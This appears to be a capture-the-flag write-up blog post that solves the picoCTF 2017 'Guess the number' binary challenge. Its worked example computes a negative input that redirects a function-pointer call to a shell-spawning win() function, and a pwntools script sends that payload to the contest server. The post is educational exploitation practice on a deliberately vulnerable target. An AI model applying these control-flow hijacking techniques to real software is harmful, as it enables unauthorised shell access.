Title: PicoCTF 2017 Lvl2 Guess the number
Date: 2018-7-28 10:02
Modified: 2018-7-28 10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation
Slug: picoCTF_lvl2GuessTheNumber
Authors: F3real
Summary: How to solve picoCTF Lvl2 Guess the number

Let's look at another of the challenges from picoCTF:

>    Just a simple number-guessing game. How hard could it be? [Binary](https://webshell2017.picoctf.com/static/69834a84e2bf2d2953093f5d24d12fa0/guess_num) [Source](https://webshell2017.picoctf.com/static/69834a84e2bf2d2953093f5d24d12fa0/guess_num.c). Connect on shell2017.picoctf.com:44930.

We are given the following source code:

~~~c
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
~~~

We see that user input is being stored to `uintptr_t val` after which it is called and that we have `win` function giving shell. On first look it looks like we have just to send the address of `win` and we get a flag. The problem is that they are using `strtol` to read user input and the fact that they shift bits, but first, let's find the address of `win` function:

    objdump -d guess_num -M intel

![objdump disasembly of win function]({static}/images/2018_7_28_Guess.png){: .img-fluid .centerimage}

`win` function has address of `0x0804852b` but we also need to shift address value 4 bits to left since in code they are doing the opposite. Doing so gives us 2152223408, but now we have a problem since according to documentation of `strtol`, if the value read is out of the range of representable values by a `long int`, the function returns **LONG_MAX**(2147483647) or **LONG_MIN** (-2147483647). This means we can’t just simply send this value since it’s too big.

To solve this, we have to use negative numbers:
~~~text
    >>>x = 0x0804852b            #address of win function
    >>>bin(x)
    '0b1000000001001000010100101011'   
    >>>x = x << 4                #shift by 4 since they also shift
    >>>x
    2152223408   
    >>>bin(x)
    '0b10000000010010000101001010110000'   
    >>>x = x - (1 << 32)         #get 2nd compliment of number
    >>>x
    -2142743888                  #SOLUTION :D other steps are just to            
                                              explain what happens later

    >>>bin(x)
    '-0b1111111101101111010110101010000'

                                 #Their program will do these steps
    >>>x = x + 4294967295 + 1    
                                 #Since we have negative value which is 
                                 #assigned to unsigned variable it will   
                                 #be converted to unsigned by adding 
                                 #ULONG_MAX + 1
    >>>x
    2152223408
    >>>x = x >> 4                #program shifts our input by 4 bits
    >>>x
    134513963
    >>>bin(x)
    '0b1000000001001000010100101011'  
    >>hex(x)
    0x804852b                    #address of win function
~~~
To automate this we can write short script using **pwntools **and python:

~~~python
context.arch = 'i386'
context.terminal = 'tmux'

r = remote('shell2017.picoctf.com', 44930)
print r.recvuntil('Enter your number:')
payload = 0x0804852b
payload = payload << 4
payload = payload - (1 << (len(bin(payload))-2))

r.send(str(payload)+'\n')
r.interactive()
~~~

Running our script gives us the flag.

![objdump disasembly of win function]({static}/images/2018_7_28_Guess2.png){: .img-fluid .centerimage}
